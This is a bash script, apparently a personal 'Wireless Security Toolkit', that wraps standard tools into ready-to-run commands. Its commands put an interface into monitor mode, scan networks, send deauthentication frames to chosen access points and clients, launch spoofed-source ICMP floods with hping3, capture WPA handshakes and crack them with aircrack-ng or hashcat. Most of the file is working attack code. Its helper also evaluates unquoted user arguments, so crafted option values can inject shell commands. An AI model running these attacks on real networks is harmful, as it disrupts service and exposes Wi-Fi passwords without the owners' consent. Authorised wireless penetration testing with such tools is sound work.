#!/bin/bash
# Wireless Security Toolkit - Advanced Edition
# Usage: ./wifi-toolkit.sh [command] [options]

INTERFACE=${INTERFACE:-wlo1}
# INTERFACE=${INTERFACE:-wlp2s0}
# INTERFACE=${INTERFACE:-wlan0mon}

# Color codes
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"  # New color for command names
NC="\033[0m"

# =============================== HELPERS ===============================
print_command() {
    printf "  ${CYAN}%-18s${NC} %s\n" "$1" "$2"  # Changed to CYAN
    printf "    ${GREEN}Usage:${NC} %s\n" "$3"
    printf "    ${GREEN}Options:${NC}\n"
    printf "      %-20s %s\n" "$4" "$5"
    printf "      %-20s %s\n" "$6" "$7"
    printf "      %-20s %s\n" "$8" "$9"
    echo ""
}

print_usage() {
    echo -e "${YELLOW}Wireless Security Toolkit${NC} - Command Reference"
    echo "Usage: ./wifi-toolkit.sh [command] [options]"
    echo ""
    echo -e "Commands:"
    echo ""
    
    print_command "monitor" "Set monitor mode" \
        "./wifi-toolkit.sh monitor [INTERFACE]" \
        "INTERFACE=wlan0   Specify wireless interface" \
        "-i wlan0          Interface flag"

    print_command "managed" "Set managed mode" \
        "./wifi-toolkit.sh managed [INTERFACE]" \
        "INTERFACE=wlan0   Specify wireless interface" \
        "-i wlan0          Interface flag"

    print_command "scan2" "Scan 2.4GHz networks" \
        "./wifi-toolkit.sh scan2 [INTERFACE]" \
        "INTERFACE=wlan0   Specify wireless interface" \
        "-i wlan0          Interface flag"

    print_command "scan5" "Scan 5GHz networks" \
        "./wifi-toolkit.sh scan5 [INTERFACE]" \
        "INTERFACE=wlan0   Specify wireless interface" \
        "-i wlan0          Interface flag"

    print_command "scan-nm" "Scan with NetworkManager" \
        "./wifi-toolkit.sh scan-nm [INTERFACE]" \
        "INTERFACE=wlan0   Specify wireless interface" \
        "-i wlan0          Interface flag"    

    print_command "deauth" "Perform deauth attack" \
        "./wifi-toolkit.sh deauth [AP_MAC] [CLIENT_MAC] | [-a AP_MAC -c CLIENT_MAC]" \
        "AP_MAC=00:11:22:33:44:55  Target AP MAC" \
        "-a 00:11:22:33:44:55     AP MAC flag" \
        "CLIENT_MAC=66:77:88:99:AA:BB  Target client MAC" \
        "-c 66:77:88:99:AA:BB     Client MAC flag"

    print_command "set-channel" "Set wireless channel" \
        "./wifi-toolkit.sh set-channel [CHANNEL] [INTERFACE]" \
        "CHANNEL=6          Target channel (1-14)" \
        "-c 6               Channel flag" \
        "INTERFACE=wlan0    Specify wireless interface" \
        "-i wlan0           Interface flag"

    print_command "ping-flood" "ICMP flood attack" \
        "./wifi-toolkit.sh ping-flood [SRC_IP] [DST_IP] | [-s SRC_IP -d DST_IP]" \
        "SRC_IP=10.0.0.1    Spoofed source IP" \
        "-s 10.0.0.1        Source IP flag" \
        "DST_IP=192.168.1.1 Target IP address" \
        "-d 192.168.1.1     Destination IP flag"

    print_command "capture-handshake" "Capture WPA handshake" \
        "./wifi-toolkit.sh capture-handshake [CHANNEL] [BSSID] [OUTPUT] | [-c CHANNEL -b BSSID -o OUTPUT]" \
        "CHANNEL=6          Target channel" \
        "-c 6               Channel flag" \
        "BSSID=00:11:22:33:44:55  Target BSSID" \
        "-b 00:11:22:33:44:55     BSSID flag" \
        "OUTPUT=file        Output prefix" \
        "-o file            Output flag"

    print_command "crack" "Crack WPA handshake" \
        "./wifi-toolkit.sh crack [WORDLIST] [CAP] | [-w WORDLIST -f CAP]" \
        "WORDLIST=wordlist.txt  Password dictionary" \
        "-w wordlist.txt        Wordlist flag" \
        "CAP=file.cap          Capture file" \
        "-f file.cap           Capture file flag"

    print_command "convert-hc" "Convert to Hashcat format" \
        "./wifi-toolkit.sh convert-hc [PCAP] [HASH_FILE] | [-p PCAP -H HASH_FILE]" \
        "PCAP=dump.pcapng     Input capture file" \
        "-p dump.pcapng       PCAP flag" \
        "HASH_FILE=hash.hc22000 Output file" \
        "-H hash.hc22000      Hash file flag"

    print_command "hashcat" "Attack with Hashcat" \
        "./wifi-toolkit.sh hashcat [HASH_FILE] [WORDLIST] | [-H HASH_FILE -w WORDLIST]" \
        "HASH_FILE=hash.hc22000  Target hash file" \
        "-H hash.hc22000         Hash file flag" \
        "WORDLIST=wordlist.txt   Password dictionary" \
        "-w wordlist.txt         Wordlist flag"
}

execute_and_check() {
    echo -e "${GREEN}=> $1${NC}"
    eval "$1"
    if [ $? -ne 0 ]; then
        echo -e "${RED}Command failed: $1${NC}"
        exit 1
    fi
}

# ======================================================================
#  PARAMETER PARSING
# ======================================================================
parse_common() {
    while getopts ":i:a:c:s:d:b:o:w:f:p:H:h" opt; do
        case $opt in
            i) INTERFACE="$OPTARG" ;;
            a) AP_MAC="$OPTARG" ;;
            c) CHANNEL="$OPTARG" ;;
            s) SRC_IP="$OPTARG" ;;
            d) DST_IP="$OPTARG" ;;
            b) BSSID="$OPTARG" ;;
            o) OUTPUT="$OPTARG" ;;
            w) WORDLIST="$OPTARG" ;;
            f) CAP="$OPTARG" ;;
            p) PCAP="$OPTARG" ;;
            H) HASH_FILE="$OPTARG" ;;
            h) print_usage ;;
            \?) echo "Invalid option -$OPTARG"; exit 1 ;;
        esac
    done
    shift $((OPTIND-1))
}

# ======================================================================
#  MONITOR MODE COMMAND
# ======================================================================
cmd_monitor() {
    parse_common "$@"
    execute_and_check "systemctl stop NetworkManager"
    execute_and_check "ip link set $INTERFACE down"
    execute_and_check "iw dev $INTERFACE set type monitor"
    execute_and_check "ip link set $INTERFACE up"
    echo -e "${GREEN}Interface $INTERFACE in monitor mode${NC}"
}

# ======================================================================
#  MANAGED MODE COMMAND
# ======================================================================
cmd_managed() {
    parse_common "$@"
    execute_and_check "systemctl stop NetworkManager"
    execute_and_check "ip link set $INTERFACE down"
    execute_and_check "iw dev $INTERFACE set type managed"
    execute_and_check "ip link set $INTERFACE up"
    execute_and_check "systemctl start NetworkManager"
    echo -e "${GREEN}Interface $INTERFACE in managed mode${NC}"
}

# ======================================================================
#  2.4GHz SCAN COMMAND
# ======================================================================
cmd_scan2() {
    parse_common "$@"
    execute_and_check "airodump-ng --band bg $INTERFACE"
}

# ======================================================================
#  5GHz SCAN COMMAND
# ======================================================================
cmd_scan5() {
    parse_common "$@"
    execute_and_check "airodump-ng --band a $INTERFACE"
}

# ======================================================================
#  NETWORKMANAGER SCAN COMMAND
# ======================================================================
cmd_scan-nm() {
    parse_common "$@"
    execute_and_check "nmcli dev wifi list ifname $INTERFACE"
}

# ======================================================================
#  DEAUTH ATTACK COMMAND
# ======================================================================
cmd_deauth() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        AP_MAC=${AP_MAC:-$1}
        CLIENT_MAC=${CLIENT_MAC:-$2}
    fi
    [ -z "$AP_MAC" ] && { echo -e "${RED}AP_MAC required${NC}"; exit 1; }
    [ -z "$CLIENT_MAC" ] && { echo -e "${RED}CLIENT_MAC required${NC}"; exit 1; }
    execute_and_check "aireplay-ng --deauth 10 -a $AP_MAC -c $CLIENT_MAC $INTERFACE"
}

# ======================================================================
#  SET CHANNEL COMMAND
# ======================================================================
cmd_set-channel() {
    parse_common "$@"
    if [ $# -ge 1 ]; then
        CHANNEL=${CHANNEL:-$1}
    fi
    [ -z "$CHANNEL" ] && { echo -e "${RED}CHANNEL required${NC}"; exit 1; }
    execute_and_check "iw dev $INTERFACE set channel $CHANNEL"
}

# ======================================================================
#  PING FLOOD COMMAND
# ======================================================================
cmd_ping-flood() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        SRC_IP=${SRC_IP:-$1}
        DST_IP=${DST_IP:-$2}
    fi
    [ -z "$SRC_IP" ] && { echo -e "${RED}SRC_IP required${NC}"; exit 1; }
    [ -z "$DST_IP" ] && { echo -e "${RED}DST_IP required${NC}"; exit 1; }
    execute_and_check "hping3 -1 --flood -a $SRC_IP $DST_IP"
}

# ======================================================================
#  CAPTURE HANDSHAKE COMMAND
# ======================================================================
cmd_capture-handshake() {
    parse_common "$@"
    if [ $# -ge 3 ]; then
        CHANNEL=${CHANNEL:-$1}
        BSSID=${BSSID:-$2}
        OUTPUT=${OUTPUT:-$3}
    fi
    [ -z "$CHANNEL" ] && { echo -e "${RED}CHANNEL required${NC}"; exit 1; }
    [ -z "$BSSID" ] && { echo -e "${RED}BSSID required${NC}"; exit 1; }
    [ -z "$OUTPUT" ] && { echo -e "${RED}OUTPUT required${NC}"; exit 1; }
    execute_and_check "airodump-ng -w $OUTPUT -c $CHANNEL --bssid $BSSID $INTERFACE"
}

# ======================================================================
#  CRACK HANDSHAKE COMMAND
# ======================================================================
cmd_crack() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        WORDLIST=${WORDLIST:-$1}
        CAP=${CAP:-$2}
    fi
    [ -z "$WORDLIST" ] && { echo -e "${RED}WORDLIST required${NC}"; exit 1; }
    [ -z "$CAP" ] && { echo -e "${RED}CAP required${NC}"; exit 1; }
    execute_and_check "aircrack-ng -a2 -w $WORDLIST $CAP"
}

# ======================================================================
#  CONVERT TO HASHCAT FORMAT
# ======================================================================
cmd_convert-hc() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        PCAP=${PCAP:-$1}
        HASH_FILE=${HASH_FILE:-$2}
    fi
    [ -z "$PCAP" ] && { echo -e "${RED}PCAP required${NC}"; exit 1; }
    [ -z "$HASH_FILE" ] && { echo -e "${RED}HASH_FILE required${NC}"; exit 1; }
    execute_and_check "hcxpcapngtool -o $HASH_FILE -E ssids $PCAP"
}

# ======================================================================
#  HASHCAT ATTACK COMMAND
# ======================================================================
cmd_hashcat() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        HASH_FILE=${HASH_FILE:-$1}
        WORDLIST=${WORDLIST:-$2}
    fi
    [ -z "$HASH_FILE" ] && { echo -e "${RED}HASH_FILE required${NC}"; exit 1; }
    [ -z "$WORDLIST" ] && { echo -e "${RED}WORDLIST required${NC}"; exit 1; }
    execute_and_check "hashcat -m 22000 $HASH_FILE $WORDLIST"
}

# ======================================================================
#  MAIN EXECUTION
# ======================================================================
case "$1" in
    # Add 'shift' to remove command name from arguments
    monitor)
        shift
        cmd_monitor "$@" ;;
    managed)
        shift
        cmd_managed "$@" ;;
    scan2)
        shift
        cmd_scan2 "$@" ;;
    scan5)
        shift
        cmd_scan5 "$@" ;;
    scan-nm)
        shift
        cmd_scan-nm "$@" ;;
    deauth)
        shift
        cmd_deauth "$@" ;;
    set-channel)
        shift
        cmd_set-channel "$@" ;;
    ping-flood)
        shift
        cmd_ping-flood "$@" ;;
    capture-handshake)
        shift
        cmd_capture-handshake "$@" ;;
    crack)
        shift
        cmd_crack "$@" ;;
    convert-hc)
        shift
        cmd_convert-hc "$@" ;;
    hashcat)
        shift
        cmd_hashcat "$@" ;;
    
    help|*) 
        print_usage
        exit ${1:-1} ;;
esac
